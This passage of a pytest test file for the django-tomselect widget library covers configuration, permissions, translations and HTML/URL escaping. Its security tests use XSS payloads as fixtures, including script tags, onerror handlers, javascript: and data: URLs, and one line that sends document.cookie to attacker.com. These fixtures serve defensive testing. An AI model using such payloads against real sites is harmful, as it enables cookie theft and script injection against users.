        class RequestMissingMethod:
            """Mock request missing specific methods."""

            method = "GET"
            GET = {}

            class User:
                """Mock user object."""

                is_authenticated = True

            user = User()

        # Add all methods except the one we're testing
        for m in ["get_full_path"]:
            if m != method_name:
                setattr(RequestMissingMethod, m, lambda self: None)

        request = RequestMissingMethod()
        assert not widget.validate_request(request)

    @pytest.mark.parametrize(
        "field,lookup",
        [
            ("magazine", "id"),
            ("category", "parent_id"),
            ("author", "user_id"),
        ],
    )
    def test_filter_by_context_various_fields(self, setup_widget, field, lookup):
        """Test context generation with different filter_by configurations."""
        config = TomSelectConfig(url="autocomplete-edition", filter_by=(field, lookup))
        widget = setup_widget(config)
        context = widget.get_context("test", None, {})

        assert context["widget"]["dependent_field"] == field
        assert context["widget"]["dependent_field_lookup"] == lookup

    def test_get_label_nonexistent_prepare_method(self, setup_widget, sample_edition):
        """Test get_label_for_object when prepare method doesn't exist."""
        widget = setup_widget()
        widget.label_field = "custom_label"

        class MockView:
            """Mock view without prepare method."""

        label = widget.get_label_for_object(sample_edition, MockView())
        assert label == str(sample_edition)

    def test_get_context_without_request(self, setup_widget):
        """Test context generation when no request is available."""
        widget = setup_widget()
        widget.get_current_request = lambda: None
        context = widget.get_context("test", None, {})

        # Should still have basic context without permission-specific data
        assert "widget" in context
        assert "autocomplete_url" in context["widget"]
        assert "plugins" in context["widget"]

    @pytest.mark.parametrize("permission_result", [True, False])
    def test_model_url_context_with_permissions(self, setup_widget, permission_result, monkeypatch):
        """Test URL context generation with different permission results."""
        widget = setup_widget()

        def mock_reverse(*args, **kwargs):
            return "/test-url/"

        monkeypatch.setattr("django_tomselect.widgets.safe_reverse", mock_reverse)

        class MockRequest:
            """Mock request for permission checks."""

            user = type("User", (), {"is_authenticated": True})()
            method = "GET"
            GET = {}

            def get_full_path(self):
                """Mock get_full_path method."""
                return "/test/"

        class MockView:
            """Mock view with configurable permissions."""

            list_url = "test-list"
            create_url = "test-create"

            def has_permission(self, request, action):
                """Mock has_permission method."""
                return permission_result

            def get_queryset(self):
                """Return all editions."""
                return Edition.objects.all()

        widget.get_current_request = lambda: MockRequest()
        context = widget.get_model_url_context(MockView())

        if permission_result:
            assert context["view_list_url"] == "/test-url/"
            assert context["view_create_url"] == "/test-url/"
        else:
            assert context["view_list_url"] is None
            assert context["view_create_url"] is None


@pytest.mark.django_db
class TestWidgetPermissionsAndURLs:
    """Test permission checks and URL generation in TomSelect widgets."""

    @pytest.fixture
    def mock_request(self):
        """Create a mock request with authentication."""

        class MockRequest:
            """Mock request with authentication."""

            class User:
                """Mock user object."""

                is_authenticated = True

                def has_perms(self, perms):
                    """Mock has_perms method."""
                    return True

            user = User()
            method = "GET"
            GET = {}

            def get_full_path(self):
                """Mock get_full_path method."""
                return "/test/"

        return MockRequest()

    @pytest.fixture
    def setup_widget(self, mock_request):
        """Create widget with permission configuration."""

        def _create_widget(config=None, **kwargs):
            if config is None:
                config = TomSelectConfig(url="autocomplete-edition")
            widget = TomSelectModelWidget(config=config, **kwargs)
            widget.get_current_request = lambda: mock_request
            return widget

        return _create_widget

    @pytest.mark.parametrize(
        "permission_config",
        [
            {"skip_authorization": True},
            {"allow_anonymous": True},
        ],
    )
    def test_permission_overrides(self, setup_widget, mock_request, permission_config):
        """Test permission override configurations."""
        widget = setup_widget(None, **permission_config)

        class MockView:
            """Mock view with configurable permissions."""

            def has_permission(self, request, action):
                """Mock has_permission method."""
                # Should return True because of overrides
                return (
                    True
                    if permission_config.get("skip_authorization") or permission_config.get("allow_anonymous")
                    else False
                )

            def get_queryset(self):
                """Return all editions."""
                return Edition.objects.all()

        mock_view = MockView()
        mock_view.skip_authorization = permission_config.get("skip_authorization", False)
        mock_view.allow_anonymous = permission_config.get("allow_anonymous", False)

        context = widget.get_permissions_context(mock_view)
        assert any(context.values()), "At least one permission should be True"


@pytest.mark.django_db
class TestTomSelectIterablesWidget:
    """Additional tests for TomSelectIterablesWidget."""

    def test_set_request_warning(self, caplog):
        """Test warning message when setting request on iterables widget."""
        widget = TomSelectIterablesWidget()
        with caplog.at_level(logging.WARNING):
            widget.set_request("request")
            assert "Request object is not required" in caplog.text

    def test_invalid_iterable_type(self):
        """Test widget with invalid iterable type in view."""
        widget = TomSelectIterablesWidget(config=TomSelectConfig(url="autocomplete-article-status"))

        class MockView:
            """Mock view with invalid iterable type."""

            iterable = 123  # Invalid iterable type

            def setup(self, request):
                """Mock setup method."""

        widget.get_autocomplete_view = lambda: MockView()
        context = widget.get_context("test", "value", {})
        assert "selected_options" in context["widget"]
        assert len(context["widget"]["selected_options"]) == 1
        assert context["widget"]["selected_options"][0]["value"] == "value"


@pytest.mark.django_db
class TestWidgetValidationAndPermissions:
    """Test validation and permission handling."""

    def test_get_instance_url_context_no_urls(self, sample_edition):
        """Test instance URL context when no URLs are configured."""
        widget = TomSelectModelWidget(config=TomSelectConfig(url="autocomplete-edition"))

        class MockView:
            """Mock view with no URLs."""

            detail_url = None
            update_url = None
            delete_url = None

            def has_permission(self, request, action):
                """Mock has_permission method."""
                return True

        urls = widget.get_instance_url_context(sample_edition, MockView())
        assert not urls

    @pytest.mark.parametrize("has_get_full_path", [True, False])
    def test_validate_request_get_full_path(self, has_get_full_path):
        """Test request validation with and without get_full_path method."""
        widget = TomSelectModelWidget()

        class MockRequest:
            """Mock request with or without get_full_path method."""

            method = "GET"
            GET = {}

            class User:
                """Mock user object."""

                is_authenticated = True

            user = User()

        if has_get_full_path:
            MockRequest.get_full_path = lambda self: "/test/"

        request = MockRequest()
        assert widget.validate_request(request) == has_get_full_path

    def test_field_permission_caching(self, mock_request):
        """Test that permissions are properly cached."""
        # Set up caching
        permission_cache.cache = cache
        permission_cache.enabled = True
        permission_cache.timeout = 300
        cache.clear()

        widget = TomSelectModelWidget(config=TomSelectConfig(url="autocomplete-edition"))

        class MockView:
            """Mock view with permission caching."""

            model = Edition

            def has_permission(self, request, action):
                """Mock has_permission method."""
                return True

            def get_queryset(self):
                """Return all editions."""
                return Edition.objects.all()

            def get_permission_required(self):
                """Return required permissions."""
                return ["view_edition"]

        view = MockView()

        # Set the request on the view
        view.request = mock_request
        widget.request = mock_request

        # First call should cache the permission
        context = widget.get_permissions_context(view)
        assert context["can_view"] is True

        # Set the permission directly using the permission_cache method
        permission_cache.set_permission(user_id=mock_request.user.id, model_name="edition", action="view", value=True)

        # Verify permission was cached correctly
        assert (
            permission_cache.get_permission(user_id=mock_request.user.id, model_name="edition", action="view") is True
        )


@pytest.mark.django_db
class TestWidgetAttributeHandling:
    """Test widget attribute and config handling."""

    def test_merge_configs_behavior(self):
        """Test merge_configs when override is None."""
        base_config = TomSelectConfig(url="test-url")
        result = merge_configs(base_config, None)
        assert result == base_config

    def test_get_current_request_none(self):
        """Test get_current_request when no request is available."""
        widget = TomSelectModelWidget()
        assert widget.get_current_request() is None

    def test_init_config_dict_handling(self):
        """Test initializing widget with dict converted to TomSelectConfig."""
        config = TomSelectConfig(url="test-url", value_field="custom_field")
        widget = TomSelectModelWidget(config=config)
        assert widget.url == "test-url"
        assert widget.value_field == "custom_field"
        assert not hasattr(widget, "invalid_key")

    def test_get_model_url_context_with_empty_urls(self):
        """Test get_model_url_context with view missing URL attributes."""

        class MockView:
            """Mock view with no URL attributes."""

            def has_permission(self, request, action):
                """Mock has_permission method."""
                return True

            def get_queryset(self):
                """Return all editions."""
                return Edition.objects.all()

        widget = TomSelectModelWidget(config=TomSelectConfig(url="autocomplete-edition"))
        context = widget.get_model_url_context(MockView())
        assert context == {"view_list_url": None, "view_create_url": None}


@pytest.mark.django_db
class TestWidgetPluginHandling:
    """Test plugin handling in widgets."""

    def test_plugin_context_with_extra_columns(self):
        """Test plugin context generation with extra columns."""
        config = TomSelectConfig(
            url="test-url",
            plugin_dropdown_header=PluginDropdownHeader(extra_columns={"column1": "Label 1", "column2": "Label 2"}),
        )
        widget = TomSelectModelWidget(config=config)
        plugins = widget.get_plugin_context()
        header_dict = plugins["dropdown_header"]
        assert "extra_headers" in header_dict
        assert "extra_values" in header_dict
        assert header_dict["extra_headers"] == ["Label 1", "Label 2"]
        assert header_dict["extra_values"] == ["column1", "column2"]

    def test_get_plugin_context_empty_plugins(self):
        """Test get_plugin_context with no plugins configured."""
        widget = TomSelectModelWidget(config=TomSelectConfig(url="test-url"))
        plugins = widget.get_plugin_context()
        assert plugins["checkbox_options"] is False
        assert plugins["dropdown_input"] is False


@pytest.mark.django_db
class TestWidgetErrorHandling:
    """Test error handling in widgets."""

    def test_get_model_with_invalid_choices_queryset(self):
        """Test get_model with invalid choices queryset."""
        widget = TomSelectModelWidget()

        class InvalidQueryset:
            """Invalid queryset class."""

        widget.choices = InvalidQueryset()
        assert widget.get_model() is None

    def test_load_throttle_validation(self):
        """Test validation of load_throttle config."""
        with pytest.raises(ValidationError):
            TomSelectConfig(url="test-url", load_throttle=-1)

    def test_max_items_validation(self):
        """Test validation of max_items config."""
        with pytest.raises(ValidationError):
            TomSelectConfig(url="test-url", max_items=0)

    def test_max_options_validation(self):
        """Test validation of max_options config."""
        with pytest.raises(ValidationError):
            TomSelectConfig(url="test-url", max_options=0)

    def test_minimum_query_length_validation(self):
        """Test validation of minimum_query_length config."""
        with pytest.raises(ValidationError):
            TomSelectConfig(url="test-url", minimum_query_length=-1)


@pytest.mark.django_db
class TestWidgetRequestValidation:
    """Test request validation scenarios."""

    class MockUser:
        """Mock user for testing."""

        is_authenticated = True

        def has_perms(self, perms):
            """Mock has_perms method."""
            return True

    class BaseMockRequest:
        """Base request class for testing."""

        _method = "GET"
        _get = {}
        _user = None

        @property
        def method(self):
            """Mock method property."""
            return self._method

        @property
        def GET(self):  # pylint: disable=C0103
            """Mock GET property."""
            return self._get

        @property
        def user(self):
            """Mock user property."""
            return self._user

        def get_full_path(self):
            """Mock get_full_path method."""
            return "/test/"

    def create_mock_request(self, include_method=True, include_get=True, include_user=True):
        """Create a mock request with specified attributes."""

        class TestRequest(self.BaseMockRequest):
            """Test request class with optional attributes."""

        request = TestRequest()
        if include_user:
            request._user = self.MockUser()
        if include_method:
            request._method = "GET"
        if include_get:
            request._get = {}
        return request

    def test_validate_request_missing_user(self):
        """Test request validation when user attribute is missing."""
        widget = TomSelectModelWidget(config=TomSelectConfig(url="autocomplete-edition"))
        request = self.create_mock_request(include_user=False)
        assert not widget.validate_request(request)


@pytest.mark.django_db
class TestWidgetMediaHandling:
    """Test media handling in widgets."""

    @pytest.mark.parametrize(
        "css_framework,use_minified,expected_files",
        [
            ("default", True, ["tom-select.default.min.css", "django-tomselect.css"]),
            (
                "bootstrap4",
                True,
                ["tom-select.bootstrap4.min.css", "django-tomselect.css"],
            ),
            (
                "bootstrap5",
                True,
                ["tom-select.bootstrap5.min.css", "django-tomselect.css"],
            ),
            ("default", False, ["tom-select.default.css", "django-tomselect.css"]),
        ],
    )
    def test_media_file_combinations(self, css_framework, use_minified, expected_files):
        """Test different combinations of CSS framework and minification."""
        config = TomSelectConfig(url="test-url", css_framework=css_framework, use_minified=use_minified)
        widget = TomSelectModelWidget(config=config)
        media = widget.media

        css_files = media._css["all"]
        assert len(css_files) == len(expected_files)
        assert all(any(expected in css for expected in expected_files) for css in css_files)


@pytest.mark.django_db
class TestWidgetConfigValidation:
    """Test configuration validation in widgets."""

    @pytest.mark.parametrize(
        "config_kwargs,expected_error",
        [
            ({"load_throttle": -1}, "load_throttle must be positive"),
            ({"max_items": 0}, "max_items must be greater than 0"),
            ({"max_options": 0}, "max_options must be greater than 0"),
            ({"minimum_query_length": -1}, "minimum_query_length must be positive"),
        ],
    )
    def test_config_validation_errors(self, config_kwargs, expected_error):
        """Test various configuration validation errors."""
        base_kwargs = {"url": "test-url"}
        config_kwargs.update(base_kwargs)

        with pytest.raises(ValidationError) as exc_info:
            TomSelectConfig(**config_kwargs).validate()

        assert expected_error in str(exc_info.value)


@pytest.mark.django_db
class TestWidgetTranslations:
    """Test translation handling in TomSelect widgets."""

    def test_dropdown_header_translations(self):
        """Test translation of dropdown header labels."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            plugin_dropdown_header=PluginDropdownHeader(
                title=_lazy("Select an Edition"),
                value_field_label=_("ID"),
                label_field_label=_lazy("Edition Name"),
                extra_columns={
                    "year": _("Publication Year"),
                    "pages": _lazy("Page Count"),
                },
            ),
        )
        widget = TomSelectModelWidget(config=config)
        context = widget.get_context("test", None, {})

        header = context["widget"]["plugins"]["dropdown_header"]
        assert header["title"] == "Select an Edition"
        assert header["value_field_label"] == "ID"
        assert header["label_field_label"] == "Edition Name"
        assert "Publication Year" in header["extra_headers"]
        assert "Page Count" in header["extra_headers"]

    def test_plugin_button_translations(self):
        """Test translation of plugin button labels."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            plugin_clear_button=PluginClearButton(title=_("Clear Selection")),
            plugin_remove_button=PluginRemoveButton(title=_lazy("Remove Item"), label=_("×")),
            plugin_dropdown_footer=PluginDropdownFooter(
                title=_lazy("Available Actions"), list_view_label=_("View All"), create_view_label=_lazy("Create New")
            ),
        )
        widget = TomSelectModelWidget(config=config)
        context = widget.get_context("test", None, {})

        plugins = context["widget"]["plugins"]
        assert plugins["clear_button"]["title"] == "Clear Selection"
        assert plugins["remove_button"]["title"] == "Remove Item"
        assert plugins["remove_button"]["label"] == "×"
        assert plugins["dropdown_footer"]["title"] == "Available Actions"
        assert plugins["dropdown_footer"]["list_view_label"] == "View All"
        assert plugins["dropdown_footer"]["create_view_label"] == "Create New"

    def test_mixed_translation_methods(self):
        """Test mixing gettext and gettext_lazy in the same configuration."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            plugin_dropdown_header=PluginDropdownHeader(
                title=_lazy("Select Item"),
                value_field_label=_("Value"),
                label_field_label=_lazy("Label"),
                extra_columns={"col1": _("Column 1"), "col2": _lazy("Column 2")},
            ),
            plugin_clear_button=PluginClearButton(title=_("Clear")),
        )
        widget = TomSelectModelWidget(config=config)
        context = widget.get_context("test", None, {})

        plugins = context["widget"]["plugins"]
        header = plugins["dropdown_header"]

        # Test lazy translations
        assert header["title"] == "Select Item"
        assert header["label_field_label"] == "Label"
        assert "Column 2" in header["extra_headers"]

        # Test immediate translations
        assert header["value_field_label"] == "Value"
        assert "Column 1" in header["extra_headers"]
        assert plugins["clear_button"]["title"] == "Clear"

    def test_placeholder_translation(self):
        """Test translation of placeholder text."""
        config = TomSelectConfig(url="autocomplete-edition", placeholder=_lazy("Choose an edition..."))
        widget = TomSelectModelWidget(config=config)
        context = widget.get_context("test", None, {})

        assert context["widget"]["placeholder"] == "Choose an edition..."

    def test_translation_with_variables(self):
        """Test translations containing variables."""
        item_count = 5
        config = TomSelectConfig(
            url="autocomplete-edition",
            plugin_dropdown_header=PluginDropdownHeader(
                title=_lazy("Select up to %(count)d items") % {"count": item_count},
                value_field_label=_("ID #%(num)d") % {"num": 1},
            ),
        )
        widget = TomSelectModelWidget(config=config)
        context = widget.get_context("test", None, {})

        header = context["widget"]["plugins"]["dropdown_header"]
        assert header["title"] == "Select up to 5 items"
        assert header["value_field_label"] == "ID #1"

    def test_nested_translation_dictionary(self):
        """Test handling of nested translations in dictionary structures."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            plugin_dropdown_header=PluginDropdownHeader(
                extra_columns={"status": _lazy("Status"), "info": _("Information"), "details": _lazy("Details")}
            ),
        )
        widget = TomSelectModelWidget(config=config)
        context = widget.get_context("test", None, {})

        header = context["widget"]["plugins"]["dropdown_header"]
        assert "Status" in header["extra_headers"]
        assert "Information" in header["extra_headers"]
        assert "Details" in header["extra_headers"]

        # Verify the corresponding values are in extra_values
        assert "status" in header["extra_values"]
        assert "info" in header["extra_values"]
        assert "details" in header["extra_values"]


@pytest.mark.django_db
class TestLabelFieldInValueFields:
    """Tests to tnsure label_field is in autocomplete view's value_fields."""

    @pytest.fixture
    def setup_custom_widget(self):
        """Create a widget with custom label_field."""

        def _create_widget(label_field="custom_field"):
            config = TomSelectConfig(url="autocomplete-edition", value_field="id", label_field=label_field)
            widget = TomSelectModelWidget(config=config)
            return widget

        return _create_widget

    @pytest.fixture
    def mock_autocomplete_view(self, monkeypatch):
        """Create a mock autocomplete view with configurable value_fields."""
        from django_tomselect.autocompletes import AutocompleteModelView

        class MockAutocompleteView(AutocompleteModelView):
            """Mock autocomplete view."""

            def __init__(self, value_fields=None):
                self.value_fields = value_fields or ["id", "name"]
                self.model = Edition
                # Required attributes
                self.search_lookups = ["name__icontains"]
                self.ordering = None
                self.request = None
                self.detail_url = None
                self.update_url = None
                self.delete_url = None
                self.list_url = None
                self.create_url = None
                self.permission_required = None
                self.allow_anonymous = False
                self.skip_authorization = False

            def setup(self, model=None, request=None, *args, **kwargs):
                """Mock setup method."""
                self.model = model or Edition
                self.request = request

            def get_queryset(self):
                """Return all editions."""
                return Edition.objects.all()

            def has_permission(self, request, action):
                """Mock permission check."""
                return True

        return MockAutocompleteView

    def test_basic_validation_behavior(self, monkeypatch):
        """Test the basic behavior of the label_field validation in isolation."""
        # This test directly tests the conditional logic in get_autocomplete_view
        # without the complexity of mocking the entire widget system

        # Create a simple mock view
        class MockView:
            pass

        # Test 1: No value_fields attribute
        view1 = MockView()
        assert not hasattr(view1, "value_fields")

        # The conditional in get_autocomplete_view requires all three conditions:
        # 1. self.label_field is truthy
        # 2. hasattr(autocomplete_view, "value_fields") is True
        # 3. self.label_field not in autocomplete_view.value_fields

        # If condition 2 is False, the warning and append should not happen
        # Verifies this with a direct check
        label_field = "custom_field"
        if (
            label_field
            and hasattr(view1, "value_fields")  # This is False
            and label_field not in getattr(view1, "value_fields", [])
        ):
            # This block should NOT execute
            view1.value_fields = [label_field]

        assert not hasattr(view1, "value_fields")

        # Test 2: value_fields exists but doesn't contain label_field
        view2 = MockView()
        view2.value_fields = ["id", "name"]

        if (
            label_field
            and hasattr(view2, "value_fields")  # This is True
            and label_field not in view2.value_fields  # This is True
        ):
            # This block SHOULD execute
            view2.value_fields.append(label_field)

        assert "custom_field" in view2.value_fields


@pytest.mark.django_db
class TestWidgetSecurity:
    """Security tests for TomSelect widgets."""

    @pytest.fixture
    def malicious_edition(self):
        """Create an edition with various malicious content."""
        edition = Edition.objects.create(
            name='Attack Vector <img src="x" onerror="alert(1)">',
            year="<script>document.cookie</script>",
            pages='100" onmouseover="alert(2)',
            pub_num="javascript:alert(3)",
        )
        yield edition
        edition.delete()

    @pytest.fixture
    def setup_complex_widget(self):
        """Create widget with complex configuration for thorough testing."""

        def _create_widget(show_urls=True, with_plugins=True):
            config_kwargs = {
                "url": "autocomplete-edition",
                "value_field": "id",
                "label_field": "name",
            }

            # Add URL display options if requested
            if show_urls:
                config_kwargs.update(
                    {
                        "show_detail": True,
                        "show_update": True,
                        "show_delete": True,
                    }
                )

            # Add plugin configurations if requested
            if with_plugins:
                config_kwargs.update(
                    {
                        "plugin_dropdown_header": PluginDropdownHeader(
                            show_value_field=True, extra_columns={"year": "Year", "pub_num": "Publication #"}
                        ),
                        "plugin_dropdown_footer": PluginDropdownFooter(
                            title="Options",
                        ),
                        "plugin_clear_button": PluginClearButton(),
                        "plugin_remove_button": PluginRemoveButton(),
                    }
                )

            return TomSelectModelWidget(config=TomSelectConfig(**config_kwargs))

        return _create_widget

    def test_render_option_template_escaping(self):
        """Test escaping in the option template for dropdown choices."""
        # This test specifically targets the option.html template for search results
        widget = TomSelectModelWidget(
            config=TomSelectConfig(
                url="autocomplete-edition",
                value_field="id",
                label_field="name",
                plugin_dropdown_header=PluginDropdownHeader(show_value_field=True),
            )
        )

        # Get the rendered widget and look for proper escaping in templates
        full_render = widget.render("test_field", None)

        # Check that the option template uses escape function
        # We should find either template string syntax or function calls with escape
        assert (
            "${escape(data[this.settings.labelField])}" in full_render
            or "${data[this.settings.labelField]}" in full_render
            or "escape(data[this.settings.labelField])" in full_render
        )

    def test_javascript_url_escaping(self, setup_complex_widget, malicious_edition, monkeypatch):
        """Test that javascript: URLs are properly escaped in href attributes."""
        widget = setup_complex_widget(show_urls=True)

        # Mock methods to return javascript: URLs
        def mock_url(view_name, args=None):
            return "javascript:alert('hijacked');"

        # Override the reverse function to return our malicious URLs
        monkeypatch.setattr("django_tomselect.widgets.safe_reverse", mock_url)

        # Render the widget with a malicious edition
        rendered = widget.render("test_field", malicious_edition.pk)

        # Parse the output
        soup = BeautifulSoup(rendered, "html.parser")

        # Check that no unescaped javascript: URLs exist in href attributes
        for a_tag in soup.find_all("a"):
            if "href" in a_tag.attrs:
                assert not a_tag["href"].startswith("javascript:")

        # Check that script strings are properly escaped in the output
        assert "javascript:alert('hijacked');" not in rendered
        assert "javascript:" not in rendered or "javascript\\:" in rendered

    def test_unsafe_object_properties(self, malicious_edition):
        """Test that unsafe object properties can't be exploited."""
        # Create an object with properties that could be dangerous if not escaped
        malicious_edition.name = "Safe Name"
        malicious_edition.__proto__ = {"dangerous": "property"}
        malicious_edition.constructor = {"dangerous": "constructor"}
        malicious_edition.__defineGetter__ = lambda x: "exploit"

        widget = TomSelectModelWidget(
            config=TomSelectConfig(url="autocomplete-edition", value_field="id", label_field="name")
        )

        # This should not cause any errors or vulnerabilities
        try:
            rendered = widget.render("test_field", malicious_edition.pk)
            # If we get here without error, that's good
            assert rendered is not None
        except Exception as e:
            pytest.fail(f"Widget rendering failed with: {e}")

    def test_dropdown_inputs_sanitization(self, setup_complex_widget):
        """Test that inputs in dropdown are properly sanitized."""
        widget = setup_complex_widget(with_plugins=True)

        # Add the dropdown_input plugin which renders an input in the dropdown
        widget.plugin_dropdown_input = PluginDropdownInput()

        # Render the widget (no need for a value)
        rendered = widget.render("test_field", None)

        # Look for proper escaping in the dropdown input elements
        assert "escape(" in rendered

        # Make sure event handlers on inputs are sanitized
        assert 'input onkeyup="' not in rendered
        assert 'input onchange="' not in rendered
        assert 'input onfocus="' not in rendered


@pytest.mark.django_db
class TestWidgetEscaping:
    """Tests for proper HTML escaping in TomSelect widgets."""

    @pytest.fixture
    def html_content_edition(self):
        """Create an edition with HTML content in name field."""
        edition = Edition.objects.create(
            name='Test <b>Bold</b> & <script>alert("XSS")</script>', year="Year with <span>HTML</span>", pages=100
        )
        yield edition
        edition.delete()

    @pytest.fixture
    def mock_request(self):
        """Create a mock request with all needed attributes."""

        class MockUser:
            is_authenticated = True
            id = 1

            def has_perms(self, perms):
                return True

        class MockRequest:
            user = MockUser()
            method = "GET"
            GET = {}

            def get_full_path(self):
                return "/test/"

        return MockRequest()

    def test_option_template_escaping(self):
        """Test that HTML is properly escaped in the option template."""
        from django.template import Context, Template

        html_data = {"name": 'Option with <b>HTML</b> & <script>alert("XSS")</script>', "id": 1}

        # Create template that mimics the option.html template
        template_content = """
        {% include "django_tomselect/helpers/decode_if_needed.html" %}

        {% if widget.is_tabular %}
            <div class="row" role="row">
            {% if widget.plugins.dropdown_header.show_value_field %}
                <div class="col" role="gridcell">${escape(data[this.settings.valueField])}</div>
                <div class="col" role="gridcell">${escape(data[this.settings.labelField])}</div>
            {% else %}
                <div class="col" role="gridcell">${escape(data[this.settings.labelField])}</div>
            {% endif %}
            </div>
        {% else %}
            {% comment %} Here we would use escape function in JavaScript {% endcomment %}
            <div role="option">${escape(decodeIfNeeded(data.name))}</div>
        {% endif %}
        """

        # Create minimal context with potentially unsafe data
        context = Context(
            {
                "widget": {
                    "is_tabular": False,
                    "plugins": {
                        "dropdown_header": {
                            "show_value_field": False,
                        }
                    },
                },
                "data": html_data,
            }
        )

        template = Template(template_content)
        rendered = template.render(context)

        # Verify the template uses proper escaping syntax
        assert "${escape(" in rendered
        assert "decodeIfNeeded(" in rendered

    def test_url_escaping_in_templates(self):
        """Test that URLs with JavaScript are properly sanitized in templates."""
        from django_tomselect.utils import safe_url

        # Test various potentially unsafe URLs
        unsafe_urls = [
            "javascript:alert('XSS')",
            "javascript:void(document.location='https://attacker.com?cookie='+document.cookie)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "vbscript:alert(document.domain)",
        ]

        for url in unsafe_urls:
            result = safe_url(url)
            # URLs should either be None or properly sanitized
            assert result is None or "javascript:" not in result

    def test_get_label_for_object(self, html_content_edition):
        """Test that get_label_for_object properly escapes HTML."""
        widget = TomSelectModelWidget(
            config=TomSelectConfig(url="autocomplete-edition", value_field="id", label_field="name")
        )

        # Create a minimal mock autocomplete view
        class MockView:
            pass

        label = widget.get_label_for_object(html_content_edition, MockView())

        # Verify HTML is properly escaped
        assert "&lt;b&gt;Bold&lt;/b&gt;" in label
        assert "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;" in label  # Fixed: &quot; instead of "
        assert "&amp;lt;" not in label  # Ensure no double escaping

    def test_safe_escape_utility(self, html_content_edition):
        """Test that the safe_escape utility properly escapes HTML."""
        from django_tomselect.utils import safe_escape

        html_value = html_content_edition.name
        escaped = safe_escape(html_value)

        # Verify HTML is properly escaped
        assert "&lt;b&gt;Bold&lt;/b&gt;" in escaped
        assert "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;" in escaped  # Fixed: &quot; instead of "
        assert "&amp;lt;" not in escaped  # Ensure no double escaping

    def test_sanitize_dict_escaping(self, html_content_edition):
        """Test that sanitize_dict properly escapes HTML in dictionary values."""
        from django_tomselect.utils import sanitize_dict

        data = {
            "name": html_content_edition.name,
            "details": f"<div>Details about {html_content_edition.name}</div>",
            "nested": {"html_content": '<script>alert("Nested")</script>'},
        }

        sanitized = sanitize_dict(data)

        # Verify HTML is properly escaped in all levels
        assert "&lt;b&gt;Bold&lt;/b&gt;" in sanitized["name"]
        assert "&lt;div&gt;Details about" in sanitized["details"]
        assert (
            "&lt;script&gt;alert(&quot;Nested&quot;)&lt;/script&gt;" in sanitized["nested"]["html_content"]
        )  # Fixed: &quot; instead of "
        assert "&amp;lt;" not in sanitized["name"]  # Ensure no double escaping

    def test_dropdown_header_template_escaping(self):
        """Test that HTML in dropdown headers is properly escaped in the template."""
        from django.template import Context, Template

        # Create minimal context with potentially unsafe header content
        context = Context(
            {
                "widget": {
                    "plugins": {
                        "dropdown_header": {
                            "title": "Header with <b>HTML</b>",
                            "value_field_label": 'ID with <script>alert("XSS")</script>',
                            "label_field_label": "Name with <i>HTML</i>",
                            "header_class": "header-class",
                            "title_row_class": "row",
                            "extra_headers": ["Year with <u>HTML</u>"],
                            "extra_values": ["year"],
                        }
                    }
                }
            }
        )

        # Load the actual dropdown_header template used by the widget
        template_content = """
        {% load i18n %}

        <div class="{{ widget.plugins.dropdown_header.header_class }}"
            title="{{ widget.plugins.dropdown_header.title|escapejs }}" role="row">
            <div class="{{ widget.plugins.dropdown_header.title_row_class }}">
                <div class="col">
                    <span role="columnheader">{{ widget.plugins.dropdown_header.value_field_label|escapejs }}</span>
                </div>
                <div class="col">
                    <span role="columnheader">{{ widget.plugins.dropdown_header.label_field_label|escapejs }}</span>
                </div>
                {% for header_text in widget.plugins.dropdown_header.extra_headers %}
                <div class="col">
                    <span role="columnheader">{{ header_text|escapejs }}</span>
                </div>
                {% endfor %}
            </div>
        </div>
        """

        template = Template(template_content)
        rendered = template.render(context)

        # Check that HTML in headers is properly escaped
        assert 'title="Header with \\u003Cb\\u003EHTML\\u003C/b\\u003E"' in rendered
        assert "ID with \\u003Cscript\\u003Ealert(\\u0022XSS\\u0022)\\u003C/script\\u003E" in rendered
        assert "Name with \\u003Ci\\u003EHTML\\u003C/i\\u003E" in rendered
        assert "Year with \\u003Cu\\u003EHTML\\u003C/u\\u003E" in rendered


@pytest.mark.django_db
class TestLazyViewInWidgets:
    """Tests for LazyView usage in TomSelect widgets."""

    @pytest.fixture(autouse=True)
    def setup_test(self):
        """Set up test environment."""
        self.basic_config = TomSelectConfig(
            url="autocomplete-edition",
            value_field="id",
            label_field="name",
        )
        self.edition_model_widget = TomSelectModelWidget(config=self.basic_config)
        self.iterables_widget = TomSelectIterablesWidget(config=self.basic_config)

    def test_get_lazy_view_model_widget(self):
        """Test that get_lazy_view returns a LazyView instance for model widget."""
        lazy_view = self.edition_model_widget.get_lazy_view()

        assert isinstance(lazy_view, LazyView)
        assert lazy_view.url_name == "autocomplete-edition"

    def test_get_lazy_view_iterables_widget(self):
        """Test that get_lazy_view returns a LazyView instance for iterables widget."""
        lazy_view = self.iterables_widget.get_lazy_view()

        assert isinstance(lazy_view, LazyView)
        assert lazy_view.url_name == "autocomplete-edition"

    def test_get_autocomplete_url_from_lazy_view(self):
        """Test that get_autocomplete_url uses the LazyView to get the URL."""
        url = self.edition_model_widget.get_autocomplete_url()
        expected_url = reverse_lazy("autocomplete-edition")

        assert url == expected_url

    def test_lazy_view_caching(self):
        """Test that the LazyView instance is cached."""
        # Get the LazyView instance twice
        lazy_view1 = self.edition_model_widget.get_lazy_view()
        lazy_view2 = self.edition_model_widget.get_lazy_view()

        # They should be the same instance
        assert lazy_view1 is lazy_view2

    def test_get_queryset_from_lazy_view(self, monkeypatch):
        """Test that get_queryset uses the LazyView to get the queryset."""
        # Create a mock queryset
        mock_queryset = Edition.objects.all()

        # Create a mock lazy_view that returns a view with our mock queryset
        class MockLazyView(LazyView):
            """Mock LazyView that returns a view with our mock queryset."""

            def get_queryset(self):
                """Return the mock queryset."""
                return mock_queryset

        # Patch the get_lazy_view method to return our mock lazy_view
        monkeypatch.setattr(self.edition_model_widget, "get_lazy_view", lambda: MockLazyView("autocomplete-edition"))

        # Get the queryset and check it's our mock queryset
        queryset = self.edition_model_widget.get_queryset()
        assert queryset is mock_queryset

    def test_invalid_url_in_lazy_view(self, monkeypatch):
        """Test handling of invalid URL in LazyView."""
        # Create a mock lazy_view that raises NoReverseMatch
        class MockLazyView(LazyView):
            """Mock LazyView that raises NoReverseMatch."""

            def get_url(self):
